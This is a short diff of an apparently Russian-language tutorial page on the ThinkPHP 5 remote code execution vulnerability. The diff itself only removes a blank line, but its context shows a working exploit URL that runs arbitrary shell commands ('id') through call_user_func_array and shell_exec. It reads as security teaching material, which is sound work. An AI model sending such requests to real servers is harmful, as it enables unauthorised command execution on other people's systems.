@@ -31,7 +31,6 @@ http://ваш-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call
 Также вы можете выполнять произвольные команды на целевой машине, например команду "id":
 ```
 http://ваш-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=id
-
 ```
 <figure><img src="../../.gitbook/assets/thinkphp-5-rce(3).png" alt=""><figcaption></figcaption></figure>
 
